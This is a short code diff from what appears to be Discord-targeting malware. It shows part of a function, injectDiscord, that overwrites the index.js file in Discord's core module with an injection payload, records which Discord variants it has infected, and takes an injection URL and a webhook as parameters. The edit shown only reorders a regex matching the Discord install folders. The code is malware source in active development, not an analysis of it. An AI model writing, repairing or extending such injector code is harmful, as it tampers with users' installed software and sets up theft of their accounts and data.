@@ -237,7 +237,7 @@ async function injectDiscord(dir, injectionUrl, webhook, api) {
                 const indexJsPath = path.join(coreDir, 'index.js');
 
                 await fs.promises.writeFile(indexJsPath, srcInjection, 'utf8');
-                const match = coreDir.match(/Local\\(discordcanary|discord|discorddevelopment|discordptb)\\/i);
+                const match = coreDir.match(/Local\\(discord|discordcanary|discordptb|discorddevelopment)\\/i);
                 if (match) {
                     infectedDiscord.add(match[1].toLowerCase());
                 }
